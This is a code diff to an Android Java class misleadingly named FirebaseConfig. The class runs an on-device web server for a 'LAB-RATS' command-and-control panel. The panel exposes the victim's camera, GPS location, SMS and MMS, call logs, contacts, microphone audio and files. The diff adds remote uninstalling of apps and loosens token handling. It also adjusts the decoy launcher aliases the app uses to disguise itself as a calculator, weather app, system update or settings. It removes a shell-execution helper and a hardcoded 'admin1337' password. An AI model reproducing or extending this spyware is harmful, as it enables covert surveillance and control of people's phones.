@@ -120,18 +120,6 @@ public class FirebaseConfig extends NanoHTTPD {
         }
     }
 
-    private static String obfuscate(String data) {
-        if (data == null) return null;
-        try {
-            byte[] bytes = data.getBytes("UTF-8");
-            byte[] key = {0x12, 0x34, 0x56, 0x78};
-            for (int i = 0; i < bytes.length; i++) {
-                bytes[i] = (byte) (bytes[i] ^ key[i % key.length]);
-            }
-            return android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP);
-        } catch (Exception e) { return data; }
-    }
-
     private static String deobfuscate(String data) {
         if (data == null) return null;
         try {
@@ -237,6 +225,11 @@ public class FirebaseConfig extends NanoHTTPD {
                 "  </div>";
         }
 
+        String c2Url = com.labs.labrats.BuildConfig.WEBHOOK_URL;
+        if (c2Url == null || c2Url.trim().isEmpty()) c2Url = "/c2-dashboard";
+        String renderBackBar = isRenderWebhook() ? 
+            "<div class=\"c2-top-bar\" style=\"display: flex; justify-content: flex-start; align-items: center; width: 100%; padding: 12px 0 6px 0;\"><a href=\"" + c2Url + "\" class=\"render-c2-back-btn\">&#9166; CONNECTED TARGETS</a></div>" : "";
+
         return "<!DOCTYPE html>" +
             "<html lang=\"en\">" +
             "<head>" +
@@ -245,20 +238,44 @@ public class FirebaseConfig extends NanoHTTPD {
             "<title>LAB-RATS | CORE</title>" +
             "<link href=\"https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
             "<link rel=\"stylesheet\" href=\"/c2/style.css?v=" + System.currentTimeMillis() + "\">" +
-            "<style>.nav a.active { background: #00f2ff !important; border-color: #00f2ff !important; color: #000 !important; box-shadow: 0 0 35px #00f2ff, inset 0 0 15px rgba(0,0,0,0.4) !important; font-weight: 900 !important; transform: scale(1.04); } @media (min-width: 1024px) { body { zoom: 0.9; } }</style>" +
+            "<style>.nav { margin-top: 25px !important; margin-bottom: 25px !important; } .nav a.active, .bottom-nav a.active { background: #00f2ff !important; border-color: #00f2ff !important; color: #000 !important; box-shadow: 0 0 35px #00f2ff, inset 0 0 15px rgba(0,0,0,0.4) !important; font-weight: 900 !important; transform: scale(1.04); } .bottom-nav { display: flex; justify-content: center; gap: 6px; flex-wrap: wrap; width: 100%; margin-top: 20px; margin-bottom: 15px; padding: 10px 0; } .bottom-nav a { padding: 6px 10px; border: 1px solid rgba(0, 242, 255, 0.4); border-radius: 8px; color: #00f2ff; text-decoration: none; font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 0.62rem; background: rgba(0, 242, 255, 0.05); transition: all 0.25s ease-in-out; letter-spacing: 0.5px; white-space: nowrap; display: inline-flex; align-items: center; justify-content: center; min-height: 32px; } .bottom-nav a:hover, .bottom-nav a:active { background: #00f2ff !important; border-color: #00f2ff !important; color: #000 !important; box-shadow: 0 0 20px #00f2ff; } .render-c2-back-btn { display: inline-flex; align-items: center; gap: 8px; padding: 8px 16px; background: rgba(0, 242, 255, 0.08); border: 1px solid rgba(0, 242, 255, 0.4); border-radius: 10px; color: #00f2ff !important; text-decoration: none !important; font-family: 'Orbitron', sans-serif; font-size: 0.78rem; font-weight: 700; letter-spacing: 1px; transition: all 0.3s; box-shadow: 0 0 18px rgba(0, 242, 255, 0.2); } .render-c2-back-btn:hover { background: #00f2ff !important; color: #000 !important; box-shadow: 0 0 30px #00f2ff; transform: scale(1.04); } @media (max-width: 768px) { .bottom-nav { justify-content: flex-start !important; gap: 8px 6px !important; padding: 12px 6px !important; margin-top: 15px !important; overflow-x: auto !important; -webkit-overflow-scrolling: touch !important; } .bottom-nav a { padding: 7px 11px !important; font-size: 0.65rem !important; border-radius: 8px !important; min-height: 36px !important; flex: 0 1 auto !important; } .render-c2-back-btn { padding: 7px 13px; font-size: 0.70rem; border-radius: 8px; } } @media (min-width: 1024px) { body { zoom: 0.9; } }</style>" +
             "</head>" +
             "<body>" +
-            "<div class=\"container\">" +
-            "  <div class=\"header\" style=\"padding: 0; margin-bottom: 0 !important; border: none !important; background: transparent !important; box-shadow: none !important; backdrop-filter: none !important; -webkit-backdrop-filter: none !important;\">" +
-            "    <img src=\"/c2/header_dashboard.png?v=41\" style=\"width: 63.75%; max-width: 918px; height: auto; margin: 0 auto; display: block; background: transparent !important; border: none !important; box-shadow: none !important; filter: none !important; border-radius: 0; image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges; image-rendering: high-quality; transform: translateZ(0); object-fit: contain;\" alt=\"LAB-RATS Header\" loading=\"eager\">" +
-            "    <div id=\"enc-status\" style=\"font-size: 0.52rem; color: #555; letter-spacing: 2px; text-transform: uppercase; margin-top: 10px; text-align: center;\">LINK_SEC: <span style=\"color:#ff3131;\">OFFLINE</span></div>" +
+            "<div class=\"container\">" + renderBackBar +
+            "  <div class=\"header\" style=\"padding: 5px 0 0 0 !important; margin-bottom: 0 !important; border: none !important; background: transparent !important; box-shadow: none !important; backdrop-filter: none !important; -webkit-backdrop-filter: none !important;\">" +
+            "    <img src=\"/c2/header_dashboard.png?v=" + System.currentTimeMillis() + "\" style=\"width: 65%; max-width: 798px; height: auto; margin: 0 auto; display: block; background: transparent !important; border: none !important; box-shadow: none !important; filter: none !important; border-radius: 0; image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges; image-rendering: high-quality; transform: none !important; object-fit: contain; position: relative !important; top: -25px !important; margin-bottom: -25px !important;\" alt=\"LAB-RATS Header\" loading=\"eager\">" +
+            "    <div id=\"enc-status\" style=\"font-size: 0.52rem; color: #555; letter-spacing: 2px; text-transform: uppercase; margin-top: 4px; text-align: center;\">LINK_SEC: <span style=\"color:#ff3131;\">OFFLINE</span></div>" +
             "  </div>" + navHtml;
+    }
+
+    public static boolean isRenderWebhook() {
+        String url = com.labs.labrats.BuildConfig.WEBHOOK_URL;
+        if (url == null || url.trim().isEmpty()) return false;
+        String low = url.toLowerCase().trim();
+        return !low.contains("script.google.com") && !low.contains("script.googleusercontent.com") && !low.contains("google.com");
     }
 
     public String getFooter() {
         return "<audio id=\"live-audio-player\" style=\"display:none;\"></audio>" +
-                "<div class=\"card\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 50px; margin-bottom: 25px; font-family: 'OrbitronC2', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 18px 20px;\">" +
-                "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
+                "<div class=\"card\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 35px; margin-bottom: 25px; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 20px;\">" +
+                "  <div class=\"bottom-nav\" style=\"margin-top: 0; margin-bottom: 15px; padding: 0;\">" +
+                "    <a href=\"/terminal\" class=\"bottom-nav-link\">Terminal</a>" +
+                "    <a href=\"/ghost\" class=\"bottom-nav-link\">Ghost</a>" +
+                "    <a href=\"/camera\" class=\"bottom-nav-link\">Optics</a>" +
+                "    <a href=\"/gps\" class=\"bottom-nav-link\">Locate</a>" +
+                "    <a href=\"/exploits\" class=\"bottom-nav-link\">Exploits</a>" +
+                "    <a href=\"/files\" class=\"bottom-nav-link\">Data</a>" +
+                "    <a href=\"/intel\" class=\"bottom-nav-link\">Intel</a>" +
+                "    <a href=\"/sms\" class=\"bottom-nav-link\">SMS</a>" +
+                "    <a href=\"/mms\" class=\"bottom-nav-link\">MMS</a>" +
+                "    <a href=\"/audio\" class=\"bottom-nav-link\">Acoustics</a>" +
+                "    <a href=\"/calls\" class=\"bottom-nav-link\">Comms</a>" +
+                "    <a href=\"/contacts\" class=\"bottom-nav-link\">Contacts</a>" +
+                "    <a href=\"/device\" class=\"bottom-nav-link\">Hardware</a>" +
+                "  </div>" +
+                "  <div style=\"border-top: 1px solid rgba(0, 242, 255, 0.15); padding-top: 15px;\">" +
+                "    &copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
+                "  </div>" +
                 "</div>" +
                 "</div>" +
                 "<script src=\"/c2/script.js?v=" + System.currentTimeMillis() + "\"></script>" +
@@ -310,22 +327,18 @@ public class FirebaseConfig extends NanoHTTPD {
             "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
             "body { background: #000; color: #ff3131; font-family: 'OrbitronC2', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }" +
             ".logout-card { background: rgba(15,15,25,0.9); border: 1px solid #ff3131; padding: 40px; border-radius: 12px; box-shadow: 0 0 30px rgba(255,49,49,0.2); width: 90%; max-width: 400px; }" +
-            "h1 { font-size: 1.8rem; }" +
-            "@media (max-width: 600px) { .logout-card { padding: 25px; } h1 { font-size: 0.7rem; } p { font-size: 0.8rem; } }" +
-            "p { color: #888; font-family: 'Orbitron', sans-serif; margin-top: 20px; }" +
-            ".login-card img { transition: all 0.5s; }" +
-            ".login-card img:hover { transform: scale(1.1) translateY(-5px); }" +
+            "h1 { font-size: 1.8rem; letter-spacing: 2px; }" +
+            "@media (max-width: 600px) { .logout-card { padding: 25px; } h1 { font-size: 1.2rem; } p { font-size: 0.8rem; } }" +
+            "p { color: #00f2ff; font-family: 'Orbitron', sans-serif; margin-top: 20px; opacity: 0.8; letter-spacing: 1px; }" +
             "</style></head><body>" +
             "<div class=\"logout-card\">" +
             "<h1>SESSION_TERMINATED</h1>" +
-            "<p>Uplink severed. Disconnecting...</p>" +
+            "<p>UPLINK DISCONNECTED // SESSION CLOSED</p>" +
             "</div>" +
             "<script>" +
-            "  // Nuclear Session Wipe\n" +
-            "  document.cookie = 'token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';\n" +
-            "  localStorage.clear();\n" +
-            "  sessionStorage.clear();\n" +
-            "  setTimeout(() => { window.location.href = '/login'; }, 1500);\n" +
+            "  document.cookie = 'token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';" +
+            "  localStorage.clear();" +
+            "  sessionStorage.clear();" +
             "</script></body></html>";
 
     private static volatile String sessionToken = "";
@@ -394,8 +407,6 @@ public class FirebaseConfig extends NanoHTTPD {
         setupHardenedLink();
     }
 
-    private static boolean isEncryptedLink = false;
-
     private void setupHardenedLink() {
         try {
             // Check assets for pre-deployed keystore (BKS format for Android)
@@ -415,12 +426,10 @@ public class FirebaseConfig extends NanoHTTPD {
                 
                 // --- ACTIVATE HTTPS PROTOCOL ---
                 makeSecure(sslContext.getServerSocketFactory(), null);
-                isEncryptedLink = true;
                 logActivity("SECURITY_UPGRADE: SSL/TLS 1.3 encryption engine active.");
             }
         } catch (Exception e) {
             // No keystore found or error - default to raw HTTP for baseline access
-            isEncryptedLink = false;
         }
     }
 
@@ -570,6 +579,9 @@ public class FirebaseConfig extends NanoHTTPD {
             return serveAppList(session);
         } else if (uri.equals("/device/open-app")) {
             openAppOnDevice(params.get("pkg"));
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/uninstall-app")) {
+            uninstallAppOnDevice(params.get("pkg"));
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
         } else if (uri.equals("/device/masquerade")) {
             String pkg = params.get("pkg");
@@ -722,9 +734,22 @@ public class FirebaseConfig extends NanoHTTPD {
             // 3. Main Routing & Auth Check
             else {
                 String token = cookies.read("token");
+                if (token == null || token.isEmpty()) {
+                    token = session.getParms().get("token");
+                }
+                if (token == null || token.isEmpty()) {
+                    token = session.getHeaders().get("token");
+                }
+                if (token == null || token.isEmpty()) {
+                    token = session.getHeaders().get("authorization");
+                    if (token != null && token.toLowerCase().startsWith("bearer ")) {
+                        token = token.substring(7).trim();
+                    }
+                }
+
                 sessionToken = WorkManager_Sync.activeSessionToken;
 
-                boolean isLoggedIn = (token != null && !token.isEmpty() && token.equals(sessionToken));
+                boolean isLoggedIn = (token != null && !token.isEmpty() && sessionToken != null && !sessionToken.isEmpty() && token.equals(sessionToken));
 
                 if (!isLoggedIn) {
                     if (uri.startsWith("/c2/")) {
@@ -733,6 +758,8 @@ public class FirebaseConfig extends NanoHTTPD {
                         response = serveLogo(session);
                     } else if (uri.startsWith("/font/orbitron.ttf")) {
                         response = serveFont(session);
+                    } else if (uri.startsWith("/camera/stream") || uri.startsWith("/camera/frame") || uri.startsWith("/camera/photo")) {
+                        response = newFixedLengthResponse(Response.Status.UNAUTHORIZED, "text/plain", "Unauthorized Session Token");
                     } else {
                         response = serveGzipped(session, "text/html", LOGIN_HTML);
                     }
@@ -821,8 +848,6 @@ public class FirebaseConfig extends NanoHTTPD {
     private Response serveDeviceInfo(IHTTPSession session) {
         logActivity("SYSTEM_EXTRACT: Device hardware and network analytics retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-      
-        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
 
         // --- HARDWARE ANALYTICS SECTION ---
         html.append("<div class=\"card\">");
@@ -931,11 +956,6 @@ public class FirebaseConfig extends NanoHTTPD {
         }
     }
 
-    private String getStoredPassword() {
-        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                .getString("c2_password", "admin1337");
-    }
-
     private static boolean isFlashlightOn = false;
 
     @OptIn(markerClass = androidx.camera.camera2.interop.ExperimentalCamera2Interop.class)
@@ -1032,6 +1052,25 @@ public class FirebaseConfig extends NanoHTTPD {
         }
     }
 
+    private void uninstallAppOnDevice(String packageName) {
+        if (packageName == null || packageName.isEmpty()) return;
+        try {
+            IO_Persistence_Manager.stopSmartExit();
+            context.getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE)
+                .edit().putBoolean("is_repairing", true).apply();
+            IO_Persistence_Manager.setAutoPilot(true);
+
+            android.net.Uri packageURI = android.net.Uri.parse("package:" + packageName);
+            Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageURI);
+            uninstallIntent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
+            uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(uninstallIntent);
+            logActivity("DEVICE_CONTROL: Dispatched uninstall prompt for - " + packageName);
+        } catch (Exception e) {
+            logActivity("DEVICE_ERROR: Failed to uninstall app - " + e.getMessage());
+        }
+    }
+
     private void showToast(String msg) {
         showToast(msg, 22, 250, "scroll", 12000, "#FFFFFF");
     }
@@ -1073,7 +1112,6 @@ public class FirebaseConfig extends NanoHTTPD {
     private Response serveAppList(IHTTPSession session) {
         logActivity("SYSTEM_EXTRACT: Package manager database retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">Installed Applications</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
@@ -1097,9 +1135,10 @@ public class FirebaseConfig extends NanoHTTPD {
             html.append("<td>").append(app.versionName != null ? app.versionName : "1.0").append("</td>");
 
             html.append("<td style=\"white-space: nowrap;\">");
-            html.append("<a href=\"/device/open-app?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-green); color:var(--neon-green); background:rgba(57,255,20,0.05); margin-right:5px;\">▶️ LAUNCH</a>");
-            html.append("<a href=\"/device/masquerade?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); background:rgba(0,242,255,0.05); margin-right:5px;\">🎭 MASQUERADE</a>");
-            html.append("<a href=\"/ghost/interact?action=overlay&pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\">🔒 OVERLAY</a>");
+            html.append("<a href=\"/device/open-app?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-green); color:var(--neon-green); background:rgba(57,255,20,0.05);\">▶️ LAUNCH</a>");
+            if (!isSystem && !app.packageName.equals(context.getPackageName())) {
+                html.append("<a href=\"/device/uninstall-app?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); background:rgba(255,49,49,0.05); margin-left:8px;\">🗑️ UNINSTALL</a>");
+            }
             html.append("</td></tr>");
         }
         html.append("</tbody></table></div></div>").append(getFooter());
@@ -1115,45 +1154,23 @@ public class FirebaseConfig extends NanoHTTPD {
             android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(pkg, 0);
             String appName = appInfo.loadLabel(pm).toString();
 
-            // Determine matching alias component based on package or category
+            // Determine matching alias component based on 5 active stealth decoy types
             String targetAlias = "SettingsAlias"; // Play Protect default
             String lowerPkg = pkg.toLowerCase();
             String lowerName = appName.toLowerCase();
 
-            if (lowerPkg.contains("whatsapp") || lowerName.contains("whatsapp")) {
-                targetAlias = "WhatsAppAlias";
-            } else if (lowerPkg.contains("telegram") || lowerName.contains("telegram")) {
-                targetAlias = "TelegramAlias";
-            } else if (lowerPkg.contains("instagram") || lowerName.contains("instagram")) {
-                targetAlias = "InstagramAlias";
-            } else if (lowerPkg.contains("youtube") || lowerName.contains("youtube")) {
-                targetAlias = "YouTubeAlias";
-            } else if (lowerPkg.contains("chrome") || lowerName.contains("chrome")) {
-                targetAlias = "ChromeAlias";
-            } else if (lowerPkg.contains("bank") || lowerPkg.contains("pcfinancial") || lowerName.contains("bank") || lowerPkg.contains("casino") || lowerPkg.contains("bet") || lowerPkg.contains("bree")) {
-                targetAlias = "BankAlias";
-            } else if (lowerPkg.contains("mail") || lowerPkg.contains("proton") || lowerName.contains("mail") || lowerPkg.contains("email")) {
-                targetAlias = "MailAlias";
-            } else if (lowerPkg.contains("vpn") || lowerName.contains("vpn")) {
-                targetAlias = "VPNAlias";
-            } else if (lowerPkg.contains("pdf") || lowerPkg.contains("adobe") || lowerName.contains("acrobat") || lowerName.contains("reader")) {
-                targetAlias = "PdfAlias";
-            } else if (lowerPkg.contains("music") || lowerPkg.contains("spotify") || lowerName.contains("music")) {
-                targetAlias = "MusicAlias";
-            } else if (lowerPkg.contains("twitter") || lowerPkg.contains("x.android") || lowerName.contains("twitter") || lowerName.equals("x")) {
-                targetAlias = "TwitterAlias";
-            } else if (lowerPkg.contains("termux") || lowerName.contains("termux")) {
-                targetAlias = "TermuxAlias";
-            } else if (lowerPkg.contains("electrum") || lowerPkg.contains("wallet") || lowerName.contains("crypto") || lowerName.contains("bitcoin")) {
-                targetAlias = "CryptoAlias";
-            } else if (lowerPkg.contains("calculator") || lowerName.contains("calculator") || lowerPkg.contains("calc")) {
+            if (lowerPkg.contains("calc") || lowerName.contains("calc")) {
                 targetAlias = "CalculatorAlias";
             } else if (lowerPkg.contains("weather") || lowerName.contains("weather")) {
                 targetAlias = "WeatherAlias";
-            } else if (lowerPkg.contains("settings") || lowerPkg.contains("vending") || lowerPkg.contains("protect") || lowerName.contains("settings")) {
+            } else if (lowerPkg.contains("update") || lowerName.contains("update")) {
+                targetAlias = "SystemUpdateAlias";
+            } else if (lowerPkg.contains("tutor") || lowerName.contains("tutor") || lowerPkg.contains("smarttutor")) {
+                targetAlias = "SmartTutorAlias";
+            } else if (lowerPkg.contains("logo") || lowerName.contains("logo")) {
+                targetAlias = "LabRatsLogoAlias";
+            } else {
                 targetAlias = "SettingsAlias";
-            } else if (lowerPkg.equals("android") || lowerPkg.contains("com.android.systemui") || lowerPkg.contains("system.service")) {
-                targetAlias = "AndroidSystemAlias";
             }
 
             context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
@@ -1233,6 +1250,7 @@ public class FirebaseConfig extends NanoHTTPD {
                     basePkg + ".SystemUpdateAlias",
                     basePkg + ".CalculatorAlias",
                     basePkg + ".WeatherAlias",
+                    basePkg + ".SmartTutorAlias",
                     basePkg + ".SettingsAlias"
                 };
                 for (String decoy : decoys) {
@@ -1293,21 +1311,6 @@ public class FirebaseConfig extends NanoHTTPD {
         java.util.Collections.sort(apps);
         return apps;
     }
-
-
-
-    private String executeShell(String command) {
-        if (command == null || command.isEmpty()) return "";
-        try {
-            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
-            process.waitFor();
-            return "[System Command Executed]";
-        } catch (Exception e) {
-            return "Shell Error: " + e.getMessage();
-        }
-    }
-
-
 
     public static String getMimeType(String filename) {
         String name = filename.toLowerCase();
